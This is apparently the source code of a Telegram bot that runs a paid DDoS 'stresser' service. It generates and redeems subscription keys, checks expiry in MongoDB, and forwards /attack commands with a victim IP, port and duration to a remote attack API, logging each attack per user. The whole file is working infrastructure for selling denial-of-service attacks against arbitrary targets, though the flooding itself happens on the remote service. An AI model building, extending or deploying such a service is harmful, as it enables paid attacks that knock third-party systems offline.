import asyncio
import logging
import secrets
import re
import os
import uuid
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    filters
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "sasta_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",") if id.strip().isdigit()]

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# --- HELPERS ---
def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def get_blocked_ports_list() -> str:
    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.keys = self.db.keys
        self._setup_db()

    def _setup_db(self):
        try:
            self.users.delete_many({"user_id": {"$in": [None, ""]}})
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.keys.create_index([("key", ASCENDING)], unique=True)
            try:
                self.users.create_index([("user_id", ASCENDING)], unique=True)
            except:
                self.users.drop_index("user_id_1")
                self.users.create_index([("user_id", ASCENDING)], unique=True)
            logger.info("✅ Database optimized.")
        except Exception as e:
            logger.error(f"❌ DB Setup Error: {e}")

    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user

    def create_user(self, user_id: int, username: str = None):
        if self.get_user(user_id): return
        self.users.insert_one({
            "user_id": user_id, "username": username, "approved": False,
            "total_attacks": 0, "created_at": get_current_time(), "is_banned": False
        })

    def generate_key(self, duration_days: int):
        key = f"SASTA-{secrets.token_hex(4).upper()}"
        self.keys.insert_one({
            "key": key, "duration": duration_days, "used": False, "created_at": get_current_time()
        })
        return key

    def redeem_key(self, user_id: int, key_str: str):
        key_doc = self.keys.find_one({"key": key_str, "used": False})
        if not key_doc: return False, "Invalid or already used key."
        
        duration = key_doc["duration"]
        expires_at = get_current_time() + timedelta(days=duration)
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        self.keys.update_one({"key": key_str}, {"$set": {"used": True, "used_by": user_id}})
        return True, f"Success! Added {duration} days access."

    def log_attack(self, user_id, ip, port, duration, status):
        self.attacks.insert_one({
            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
            "duration": duration, "status": status, "timestamp": get_current_time()
        })
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# --- DECORATORS ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized.")
            return
        return await func(update, context)
    return wrapper

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db.create_user(update.effective_user.id, update.effective_user.username)
    await update.message.reply_text(
        "🚀 **Sasta Developer Stresser Bot**\n\n"
        "Commands:\n"
        "🔹 `/attack <ip> <port> <time>`\n"
        "🔹 `/redeem <key>`\n"
        "🔹 `/myinfo` - View subscription status"
    )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: `/redeem SASTA-XXXX`")
        return
    success, msg = db.redeem_key(update.effective_user.id, context.args[0].upper())
    await update.message.reply_text("✅ " + msg if success else "❌ " + msg)

@admin_required
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    days = int(context.args[0]) if context.args else 30
    key = db.generate_key(days)
    await update.message.reply_text(f"🔑 **New Key Created ({days} Days):**\n`{key}`")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user or not user.get("approved") or user.get("expires_at") < get_current_time():
        await update.message.reply_text("❌ No active subscription. Use /redeem.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: `/attack <ip> <port> <time>`")
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    if port in BLOCKED_PORTS:
        await update.message.reply_text("❌ Port is blacklisted.")
        return

    msg = await update.message.reply_text("🚀 **Launching...**")
    try:
        res = requests.post(f"{API_URL}/api/v1/attack", 
                           json={"ip": ip, "port": port, "duration": duration},
                           headers={"x-api-key": API_KEY}, timeout=15).json()
        if res.get("success"):
            db.log_attack(user["user_id"], ip, port, duration, "success")
            await msg.edit_text(f"✅ **Attack Sent!**\nTarget: `{ip}:{port}`\nTime: `{duration}s`")
        else:
            await msg.edit_text(f"❌ Error: {res.get('error', 'Unknown')}")
    except Exception as e:
        await msg.edit_text(f"❌ Connection Error: {str(e)}")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user: return
    
    exp = user.get("expires_at")
    is_active = user.get("approved") and (not exp or exp > get_current_time())
    status = "✅ Active" if is_active else "❌ Expired/Inactive"
    exp_str = exp.strftime('%Y-%m-%d %H:%M') if exp else "N/A"
    
    await update.message.reply_text(
        f"👤 **Your Account**\n"
        f"Status: {status}\n"
        f"Expiry: `{exp_str}`\n"
        f"Total Attacks: `{user.get('total_attacks', 0)}`"
    )

# --- STARTUP LOGIC ---
def main():
    if not BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN is missing!")
        return

    application = Application.builder().token(BOT_TOKEN).build()

    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("myinfo", myinfo))

    # Get Public IP
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = "Unknown/Local"

    print("\n" + "="*40)
    print("🤖 Bot is starting...")
    print(f"Server IP: {ip}")
    print(f"📊 MongoDB: Connected and indexes optimized.")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"🌐 API URL: {API_URL}")
    print(f"🔑 API Key: {API_KEY[:10] if API_KEY else 'NONE'}...")
    print(f"🚫 Blocked Ports: {get_blocked_ports_list()}")
    print("✅ Bot is running!")
    print("="*40 + "\n")

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
